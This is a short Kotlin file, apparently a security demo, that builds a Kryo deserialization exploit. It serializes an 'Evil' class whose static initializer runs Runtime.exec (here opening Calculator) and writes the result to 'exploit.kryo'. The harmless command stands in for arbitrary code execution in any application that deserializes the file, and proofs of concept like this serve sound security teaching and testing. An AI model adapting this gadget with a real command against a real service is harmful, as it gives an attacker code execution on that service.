package appsec

import com.esotericsoftware.kryo.Kryo
import com.esotericsoftware.kryo.io.Output
import java.io.FileOutputStream


class DataInput {
    var payload: Any? = null
}

class Evil {
    companion object {
        init {
            try {
                println("rce triggered.")
                Runtime.getRuntime().exec(arrayOf("open", "-a", "Calculator"))
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}

fun main() {
    val kryo = Kryo()
    val data = DataInput()
    data.payload = Evil()
    val output = Output(FileOutputStream("exploit.kryo"))
    kryo.writeClassAndObject(output, data)
    output.close()
}
